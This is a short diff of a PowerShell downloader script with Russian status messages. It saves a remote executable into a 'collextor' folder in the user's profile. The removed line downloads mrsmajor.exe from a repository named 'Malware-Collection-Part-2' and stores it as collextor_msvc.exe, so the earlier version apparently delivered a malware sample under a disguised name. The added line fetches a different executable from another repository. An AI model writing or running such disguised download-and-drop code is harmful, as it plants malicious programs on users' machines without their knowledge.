@@ -1,14 +1,12 @@
 $dir = "$env:USERPROFILE\collextor"
 $exe = "$dir\collextor_msvc.exe"
-$url = "https://github.com/Zusyaku/Malware-Collection-Part-2/blob/main/mrsmajor.exe"
+$url = "https://github.com/TheAmalgamClient/colex/raw/main/collextor_msvc.exe"
 
 New-Item -ItemType Directory -Force -Path $dir | Out-Null
 
 Write-Host "Скачиваю..." -ForegroundColor Cyan
 try {
-    $wc = New-Object System.Net.WebClient
-    $wc.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)")
-    $wc.DownloadFile($url, $exe)
+    Invoke-WebRequest -Uri $url -OutFile $exe -UseBasicParsing
     Write-Host "Скачано." -ForegroundColor Green
 } catch {
     Write-Host "Ошибка скачивания: $_" -ForegroundColor Red
